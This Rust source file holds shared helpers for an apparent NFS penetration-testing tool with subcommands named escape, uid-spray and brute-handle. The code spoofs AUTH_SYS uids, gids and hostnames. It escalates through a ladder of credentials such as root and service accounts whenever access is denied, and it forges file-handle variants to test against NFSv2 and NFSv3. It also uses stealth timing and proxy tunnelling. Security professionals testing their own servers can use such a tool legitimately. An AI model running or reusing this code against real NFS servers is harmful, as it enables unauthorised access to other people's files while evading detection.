//! Shared connection / lookup helpers used by the offensive subcommands
//! (`escape`, `uid-spray`, `brute-handle`).
//!
//! These are pulled out of the individual subcommand files because all
//! three need the same primitives: parse a `<TARGET>` into a `SocketAddr`,
//! build a pool-backed `Nfs3Client` with a chosen credential, and walk a
//! path with credential escalation on `NFS3ERR_ACCES`.

use std::net::{IpAddr, SocketAddr};
use std::sync::Arc;

use anyhow::Context as _;

use crate::cli::GlobalOpts;
use crate::engine::credential::credential_ladder_with;
use crate::proto::auth::{AuthSys, Credential};
use crate::proto::circuit::CircuitBreaker;
use crate::proto::conn::ReconnectStrategy;
use crate::proto::mount::NfsMountClient;
use crate::proto::nfs2::Nfs2Client;
use crate::proto::nfs3::types::FileHandle;
use crate::proto::nfs3::{Nfs3Client, PooledNfs3 as _};
use crate::proto::pool::{ConnectionPool, PoolKey};
use crate::proto::transport::PooledTransport;
use crate::util::stealth::StealthConfig;

/// Build a MOUNT client honouring the global `--mount-port`,
/// `--privileged-port`, and `--proxy` flags.
///
/// Used by every subcommand that calls `MNT` (escape, shell, mount,
/// uid-spray, brute-handle) so the same flags propagate everywhere.
pub(crate) fn make_mount_client(globals: &GlobalOpts) -> NfsMountClient {
    let mut base = globals.mount_port.map_or_else(NfsMountClient::new, NfsMountClient::with_port);
    if let Some(ref p) = globals.proxy {
        base = base.with_proxy(p.clone());
    }
    if globals.privileged_port { base.require_privileged() } else { base }
}

/// Parse a host string into a `SocketAddr` using the default NFS port (2049).
///
/// Thin wrapper over [`parse_addr_with_port`] with no `--nfs-port` override,
/// kept with a stable signature for callers that do not thread the global
/// flag (e.g. `scan`).
///
/// Accepts the same `<TARGET>` shapes as the rest of the CLI:
/// `host`, `host:port`, `host:/export` (export portion ignored here), and
/// IPv6 literals (bare `2001:db8::1` or bracketed `[2001:db8::1]` / `[..]:port`).
#[cfg(test)]
pub(crate) fn parse_addr(host: &str) -> anyhow::Result<SocketAddr> {
    parse_addr_with_port(host, None)
}

/// Parse a host string into a `SocketAddr`, honouring an optional NFS-port override.
///
/// `nfs_port` is the global `--nfs-port` value: `Some(p)` overrides the default
/// 2049 so escape / uid-spray / brute-handle / shell can reach NFS on a fixed
/// port when portmapper (TCP/111) is firewalled; `None` falls back to 2049.
///
/// IPv6 literals need brackets before a port can be appended -- `SocketAddr`
/// rejects an unbracketed `2001:db8::1:2049` -- so the address is built
/// structurally from a parsed `IpAddr` rather than via string formatting.
pub(crate) fn parse_addr_with_port(host: &str, nfs_port: Option<u16>) -> anyhow::Result<SocketAddr> {
    let port = nfs_port.unwrap_or(2049);
    // Strip an optional `:/export` suffix so the colon-form target works
    // wherever a bare host did before. IPv6 literals use `::`, never `:/`,
    // so this never splits inside a v6 address.
    let host = host.find(":/").map_or(host, |idx| &host[..idx]);
    // Try direct parse first: handles `host:port` and bracketed `[ipv6]:port`,
    // preserving an explicitly-supplied port.
    if let Ok(addr) = host.parse::<SocketAddr>() {
        return Ok(addr);
    }
    // Bare IPv4 / IPv6 literal: build the address from the parsed IP so an IPv6
    // literal does not need manual bracketing (the old `format!` path produced
    // the unparseable `2001:db8::1:2049`).
    if let Ok(ip) = host.parse::<IpAddr>() {
        return Ok(SocketAddr::new(ip, port));
    }
    // Bracketed IPv6 without a port (`[2001:db8::1]`): strip the brackets.
    if let Some(ip) = host.strip_prefix('[').and_then(|h| h.strip_suffix(']')).and_then(|inner| inner.parse::<IpAddr>().ok()) {
        return Ok(SocketAddr::new(ip, port));
    }
    // IPv4-or-hostname without a port -- append the chosen port (preserves the
    // original error context for unparseable hosts).
    format!("{host}:{port}").parse::<SocketAddr>().with_context(|| format!("invalid host: {host}"))
}

/// Build the shared pool, circuit breaker, and pooled transport for a given
/// host/export/credential combination. Both `make_client_with_hostname` and
/// `make_v2_client_with_hostname` delegate here so pool/circuit/transport
/// construction is not duplicated.
fn make_pooled_transport(addr: SocketAddr, export: &str, uid: u32, gid: u32, aux_gids: &[u32], stealth: StealthConfig, proxy: Option<&str>, nfs_port: Option<u16>, hostname: &str) -> (Arc<ConnectionPool>, Arc<CircuitBreaker>, PooledTransport) {
    let pool = Arc::new(match proxy {
        Some(p) => ConnectionPool::with_proxy(p.to_owned()),
        None => ConnectionPool::default_config(),
    });
    let circuit = Arc::new(CircuitBreaker::default_config());
    let gids = build_gid_list(gid, aux_gids);
    let auth = AuthSys::with_groups(uid, gid, &gids, hostname);
    let cred = Credential::Sys(auth);
    let key = PoolKey { host: addr, export: export.to_owned(), uid, gid };
    let transport = match nfs_port {
        Some(p) => PooledTransport::new_direct(Arc::clone(&pool), key, Arc::clone(&circuit), stealth, cred, ReconnectStrategy::Persistent, p),
        None => PooledTransport::new(Arc::clone(&pool), key, Arc::clone(&circuit), stealth, cred, ReconnectStrategy::Persistent),
    };
    (pool, circuit, transport)
}

/// Build an `Nfs3Client` for the given host, export, and AUTH_SYS credential,
/// honouring the operator's spoofed `--hostname` as the AUTH_SYS machinename.
///
/// When `proxy` is `Some`, the connection pool tunnels all TCP through the
/// SOCKS5 proxy. When `nfs_port` is `Some(p)` (the global `--nfs-port`
/// override), the client connects directly to NFS port `p`, bypassing
/// portmapper GETPORT -- needed when TCP/111 is firewalled and the operator
/// knows the fixed NFS port. `None` resolves the NFS port via portmapper as
/// before.
///
/// The hostname is the client identity some servers key export ACLs on, and
/// `auth_unix.machinename` carries it on the wire (F-1.4).
pub(crate) fn make_client_with_hostname(addr: SocketAddr, export: &str, uid: u32, gid: u32, aux_gids: &[u32], stealth: StealthConfig, proxy: Option<&str>, nfs_port: Option<u16>, hostname: &str) -> (Arc<ConnectionPool>, Arc<CircuitBreaker>, Nfs3Client) {
    let (pool, circuit, transport) = make_pooled_transport(addr, export, uid, gid, aux_gids, stealth, proxy, nfs_port, hostname);
    (pool, circuit, Nfs3Client::new(transport))
}

/// Build an `Nfs2Client` for the given host, export, and AUTH_SYS credential,
/// honouring the operator's spoofed `--hostname` as the AUTH_SYS machinename.
///
/// Same semantics as [`make_client_with_hostname`] but wraps a `Nfs2Client`
/// instead of a `Nfs3Client`. The pooled transport is identical -- only the
/// protocol client type differs.
pub(crate) fn make_v2_client_with_hostname(addr: SocketAddr, export: &str, uid: u32, gid: u32, aux_gids: &[u32], stealth: StealthConfig, proxy: Option<&str>, nfs_port: Option<u16>, hostname: &str) -> (Arc<ConnectionPool>, Arc<CircuitBreaker>, Nfs2Client) {
    let (pool, circuit, transport) = make_pooled_transport(addr, export, uid, gid, aux_gids, stealth, proxy, nfs_port, hostname);
    (pool, circuit, Nfs2Client::new(transport))
}

/// Build the GID list for AUTH_SYS: primary GID first, then aux GIDs (deduped).
///
/// Public so the shell, mount, and FUSE adapters can build the same shape
/// of `gids` vector when constructing `AuthSys::with_groups`.
pub(crate) fn build_gid_list(gid: u32, aux_gids: &[u32]) -> Vec<u32> {
    let mut gids = vec![gid];
    for &g in aux_gids {
        if !gids.contains(&g) {
            gids.push(g);
        }
    }
    gids
}

/// Walk a path component-by-component from a root handle, retrying with
/// escalated credentials on `NFS3ERR_ACCES`.
///
/// The escalation ladder mirrors the one the shell and FUSE adapter use
/// (see `engine::credential::credential_ladder`): owner first, then root,
/// then well-known service accounts. File handles are bearer tokens
/// (RFC 1094 S2.3.3), so every successful escalation produces a handle
/// the caller can use with any later credential.
pub(crate) async fn lookup_path(client: &Nfs3Client, root: &FileHandle, path: &str) -> anyhow::Result<FileHandle> {
    let mut current = root.clone();

    for component in path.split('/').filter(|s| !s.is_empty()) {
        match client.resolve(&current, component).await {
            Ok((fh, _)) => current = fh,
            Err(e) if e.is_permission_denied() => {
                let facts = get_owner_uid(client, &current).await;
                let try_uids = credential_ladder_with((client.uid(), client.gid()), facts.map(|f| f.0), facts.map(|f| f.1), &[]);

                let mut resolved = false;
                for (uid, gid) in &try_uids {
                    // Preserve the client's spoofed machinename across the
                    // escalation ladder (F-1.4) instead of resetting it to a
                    // fixed literal -- so an operator's --hostname survives.
                    let esc_client = client.with_credential(Credential::Sys(AuthSys::with_groups(*uid, *gid, &[*gid], client.machinename())), *uid, *gid);
                    if let Ok((fh, _)) = esc_client.resolve(&current, component).await {
                        tracing::debug!(component, uid, gid, "LOOKUP succeeded with escalated credential");
                        current = fh;
                        resolved = true;
                        break;
                    }
                }
                if !resolved {
                    anyhow::bail!("LOOKUP {component}: NFS3ERR_ACCES (tried {} credentials)", try_uids.len());
                }
            },
            Err(e) => anyhow::bail!("LOOKUP {component}: {e}"),
        }
    }

    Ok(current)
}

/// Get the owner (uid, gid) of a file/directory handle via GETATTR.
/// Returns `None` on any error (best-effort).
async fn get_owner_uid(client: &Nfs3Client, fh: &FileHandle) -> Option<((u32, u32), u32)> {
    client.attrs(fh).await.ok().map(|a| ((a.uid, a.gid), a.mode))
}

// --- Handle acquisition matrix (Blocks 1-4) ---------------------------------

use crate::engine::file_handle::{HandleVariant, dedup_variants, derive_handle_variants};

/// Result of probing a single handle variant against NFSv3 and NFSv2.
#[derive(Debug, Clone)]
pub(crate) struct TestedHandle {
    pub variant: HandleVariant,
    pub v3_ok: bool,
    #[expect(dead_code, reason = "set during handle probing, retained for future multi-version escape analysis")]
    pub v3_stale: bool,
    #[expect(dead_code, reason = "set during handle probing, retained for future multi-version escape analysis")]
    pub v2_ok: bool,
}

/// All handle variants acquired and tested for a single export.
#[derive(Debug)]
pub(crate) struct HandleProbeResult {
    pub tested: Vec<TestedHandle>,
    /// Auth flavors from whichever MOUNT succeeded (v3 preferred).
    pub auth_flavors: Vec<u32>,
    /// MOUNT v3 failed but MOUNT v1 succeeded (F-1.6 handle leak).
    pub v1_bypass: bool,
    /// MOUNT v3 error message (for F-1.6 finding evidence).
    pub v3_error: Option<String>,
}

impl HandleProbeResult {
    /// First handle variant that works with NFSv3 GETATTR.
    pub(crate) fn best_v3(&self) -> Option<&TestedHandle> {
        self.tested.iter().find(|t| t.v3_ok)
    }
}

/// Acquire handles via MOUNT v3 and v1, derive all length variants, and test
/// each against NFSv3 + NFSv2 GETATTR.
///
/// Blocks 1-4 of the handle matrix plan: acquire -> derive -> deduplicate -> test.
pub(crate) async fn acquire_and_test_handles(mount: &NfsMountClient, _nfs3: &Nfs3Client, addr: SocketAddr, export: &str, stealth: &StealthConfig, nfs_port: Option<u16>, proxy: Option<&str>, hostname: &str) -> HandleProbeResult {
    // Build a direct-port NFS client for handle testing. This bypasses the
    // PooledTransport's lazy MOUNT, which would fail when mountd v3 is disabled.
    // The handles come from the explicit MOUNT v1/v3 calls below, not from the
    // transport's connection setup.
    let direct_port = nfs_port.unwrap_or(2049);
    let (_, _, probe_nfs3) = make_client_with_hostname(addr, export, 0, 0, &[], stealth.clone(), proxy, Some(direct_port), hostname);

    // Block 1: acquire from both MOUNT versions.
    stealth.wait().await;
    let v3_result = mount.mount(addr, export).await;
    stealth.wait().await;
    let v1_result = mount.mount_v1(addr, export).await;

    let v3_ok = v3_result.as_ref().ok();
    let v1_ok = v1_result.as_ref().ok();
    let v3_error = v3_result.as_ref().err().map(ToString::to_string);

    let auth_flavors = v3_ok.map_or_else(|| v1_ok.map_or_else(Vec::new, |r| r.auth_flavors.clone()), |r| r.auth_flavors.clone());
    let v1_bypass = v3_ok.is_none() && v1_ok.is_some();

    // Block 2: derive all length variants from each source.
    let mut variants: Vec<HandleVariant> = Vec::new();
    if let Some(r) = v3_ok {
        variants.extend(derive_handle_variants(&r.handle, "v3"));
    }
    if let Some(r) = v1_ok {
        variants.extend(derive_handle_variants(&r.handle, "v1"));
    }
    dedup_variants(&mut variants);

    if variants.is_empty() {
        return HandleProbeResult { tested: Vec::new(), auth_flavors, v1_bypass, v3_error };
    }

    // Block 3: test each variant against NFSv3 and NFSv2 GETATTR.
    let mut tested = Vec::with_capacity(variants.len());
    for variant in variants {
        stealth.wait().await;
        let (v3_ok_flag, v3_stale_flag) = match probe_nfs3.attrs(&variant.handle).await {
            Ok(_) => (true, false),
            Err(e) if e.is_permission_denied() => (true, false),
            Err(e) if e.is_stale() => (false, true),
            _ => (false, false),
        };

        // NFSv2 requires exactly 32 bytes. Produce the 32-byte form of every
        // variant (pad short, truncate long) via Nfs2FileHandle::from_bytes.
        let v2_fh = nfs_v2::wire::Nfs2FileHandle::from_bytes(variant.handle.as_bytes());
        let v2_handle = FileHandle::from_bytes(&v2_fh.0);
        stealth.wait().await;
        let v2_ok_flag = test_handle_v2(addr, &v2_handle, stealth, proxy, nfs_port, hostname).await;

        tested.push(TestedHandle { variant, v3_ok: v3_ok_flag, v3_stale: v3_stale_flag, v2_ok: v2_ok_flag });
    }

    // Unmount from both versions (best-effort, stealth).
    drop(mount.unmount(addr, export).await);

    HandleProbeResult { tested, auth_flavors, v1_bypass, v3_error }
}

/// Test a 32-byte handle with NFSv2 GETATTR. Returns true if the server accepts it.
async fn test_handle_v2(addr: SocketAddr, handle: &FileHandle, stealth: &StealthConfig, proxy: Option<&str>, nfs_port: Option<u16>, hostname: &str) -> bool {
    let (_, _, client) = make_v2_client_with_hostname(addr, "/", 0, 0, &[], stealth.clone(), proxy, nfs_port, hostname);
    let v2_fh = nfs_v2::wire::Nfs2FileHandle::from_bytes(handle.as_bytes());
    match client.getattr(&v2_fh).await {
        Ok(_) => true,
        Err(ref e) if format!("{e:?}").contains("Acces") || format!("{e:?}").contains("Perm") => true,
        _ => false,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parse_addr_ipv4_default_port() {
        assert_eq!(parse_addr("192.168.1.10").unwrap(), "192.168.1.10:2049".parse().unwrap());
    }

    #[test]
    fn parse_addr_ipv4_with_export_strips_suffix() {
        // The `:/export` portion is irrelevant to the socket address.
        assert_eq!(parse_addr("192.168.1.10:/srv").unwrap(), "192.168.1.10:2049".parse().unwrap());
    }

    #[test]
    fn parse_addr_ipv4_explicit_port_preserved() {
        // An explicit `host:port` wins over the default.
        assert_eq!(parse_addr("192.168.1.10:12049").unwrap().port(), 12049);
    }

    #[test]
    fn parse_addr_bare_ipv6_literal() {
        // A bare IPv6 literal must NOT be string-formatted as `host:2049`
        // (that yields the unparseable `2001:db8::1:2049`); it gets the
        // default NFS port structurally.
        assert_eq!(parse_addr("2001:db8::1").unwrap(), "[2001:db8::1]:2049".parse().unwrap());
    }

    #[test]
    fn parse_addr_bracketed_ipv6_with_port() {
        assert_eq!(parse_addr("[2001:db8::1]:2049").unwrap(), "[2001:db8::1]:2049".parse().unwrap());
    }

    #[test]
    fn parse_addr_bracketed_ipv6_without_port() {
        assert_eq!(parse_addr("[2001:db8::1]").unwrap(), "[2001:db8::1]:2049".parse().unwrap());
    }

    #[test]
    fn parse_addr_ipv6_loopback_with_export() {
        assert_eq!(parse_addr("[::1]:/export").unwrap(), "[::1]:2049".parse().unwrap());
    }

    #[test]
    fn parse_addr_with_port_override_applies_to_ipv4_and_ipv6() {
        // The --nfs-port override replaces the default 2049 for bare hosts.
        assert_eq!(parse_addr_with_port("192.168.1.10", Some(20490)).unwrap().port(), 20490);
        assert_eq!(parse_addr_with_port("2001:db8::1", Some(20490)).unwrap(), "[2001:db8::1]:20490".parse().unwrap());
    }

    #[test]
    fn parse_addr_with_port_none_is_default() {
        // `None` keeps the historical default so `scan` and other unthreaded
        // callers are unaffected.
        assert_eq!(parse_addr_with_port("192.168.1.10", None).unwrap().port(), 2049);
    }

    #[test]
    fn parse_addr_invalid_host_errors() {
        assert!(parse_addr("not a host").is_err());
    }

    #[test]
    fn build_gid_list_puts_primary_first_and_dedups() {
        assert_eq!(build_gid_list(42, &[42, 7, 7, 9]), vec![42, 7, 9]);
    }
}
